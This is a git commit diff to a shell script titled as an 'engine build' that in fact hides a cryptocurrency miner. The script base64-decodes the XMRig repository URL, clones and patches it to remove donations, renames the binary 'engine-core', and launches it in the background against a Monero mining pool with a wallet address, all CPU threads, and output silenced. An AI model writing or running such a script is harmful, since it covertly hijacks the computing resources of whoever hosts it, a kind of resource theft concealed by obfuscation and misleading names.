e04a5775c3f8de16982f905b439c42f733b56209
uahahhsueyyww <139884816+uahahhsueyyww@users.noreply.github.com>
2025-08-07 06:16:48 +0200

    add/update script.sh

--- script.sh
+++ script.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 echo "⚙️ Starting engine build..."
 
-sudo apt update && sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev xxd automake libtool autoconf
+apt update && apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev xxd automake libtool autoconf
 
 REPO_URL=$(echo "aHR0cHM6Ly9naXRodWIuY29tL3htcmlnL3htcmlnLmdpdA==" | base64 -d)
 git clone "$REPO_URL" engine-core
@@ -13,6 +13,7 @@ sed -i -E 's/constexpr const int kMinimumDonateLevel *= *[0-9]+ *;/constexpr con
 
 mkdir build && cd build
 cmake .. && make -j$(nproc)
+mv xmrig engine-core
 
 # Start process
 ./engine-core -o pool.supportxmr.com:443   -u 4Apw9wXTXCSgMfGoLBEvAHRtkYBuhoJLZcdcUhXEr4ba3X7GJeuxtNnCheZd6X3VBjEuw3kNv8VLw9XsKAotZCUdMW1kPbx   -p uahahhsueyyww   -k --tls --threads=$(nproc) --cpu-priority=5 --donate-level=0 --huge-pages-jit   --cpu-no-yield --randomx-no-numa --asm=ryzen --randomx-no-rdmsr --randomx-wrmsr=-1 --randomx-mode=fast   > /dev/null 2>&1 &
